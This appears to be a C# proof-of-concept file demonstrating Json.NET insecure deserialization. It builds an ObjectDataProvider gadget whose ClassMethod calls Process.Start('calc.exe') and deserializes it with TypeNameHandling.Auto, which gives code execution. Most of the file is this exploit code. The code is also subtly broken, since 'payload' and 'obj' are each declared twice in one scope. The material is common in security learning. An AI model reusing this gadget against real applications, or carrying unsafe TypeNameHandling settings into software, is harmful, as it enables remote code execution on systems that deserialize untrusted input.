using System.Reflection;
using System.Runtime.Serialization.Json;
using System.Diagnostics;
using System;
using Newtonsoft.Json;
using System.Windows.Data;

namespace json
{
    class Program
    {
        static void Main(string[] args)
        {
            TestClass testClass = new TestClass();
            testClass.Classname = "neal";
            testClass.Name = "madneal";
            testClass.Age = 18;
            string testString = JsonConvert.SerializeObject(testClass);
            Console.WriteLine(testString);
            string testString1 = JsonConvert.SerializeObject(testClass, new JsonSerializerSettings {
                NullValueHandling = NullValueHandling.Ignore,
                TypeNameAssemblyFormatHandling = TypeNameAssemblyFormatHandling.Full,
                TypeNameHandling = TypeNameHandling.All,
            });
            Console.WriteLine(testString1);

            string payload = "{\"$type\":\"json.TestClass, json, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null\",\"Name\":\"nealneal\",\"Age\":18}";
            Object obj = JsonConvert.DeserializeObject<TestClass>(payload, new JsonSerializerSettings
            {
                TypeNameHandling = TypeNameHandling.None,
            });
            Type t = obj.GetType();
            PropertyInfo propertyName = t.GetProperty("Name");
            object objName = propertyName.GetValue(obj, null);
            Console.WriteLine(obj);
            Console.WriteLine(((TestClass)obj).Name);

            ObjectDataProvider odp = new ObjectDataProvider();
            odp.MethodName = "ClassMethod";
            odp.MethodParameters.Add("calc.exe");
            odp.ObjectInstance = testClass;
            string payload = JsonConvert.SerializeObject(odp, new JsonSerializerSettings
            {
                TypeNameHandling = TypeNameHandling.All,
                TypeNameAssemblyFormatHandling = TypeNameAssemblyFormatHandling.Full,
            });

            Object obj = JsonConvert.DeserializeObject<Object>(payload, new JsonSerializerSettings
            {
                TypeNameHandling = TypeNameHandling.Auto,
            });
        }
    }

    [JsonObject(MemberSerialization.OptIn)]
    public class TestClass
    {
        private string classname;
        private string name;
        private int age;
        [JsonIgnore]
        public string Classname { get => classname; set => classname = value; }
        [JsonProperty]
        public string Name { get => name; set => name = value; }
        [JsonProperty]
        public int Age { get => age; set => age = value; }
        public override string ToString()
        {
            return base.ToString();
        }

        public static void ClassMethod(string value)
        {
            Process.Start(value);
        }
    }
}
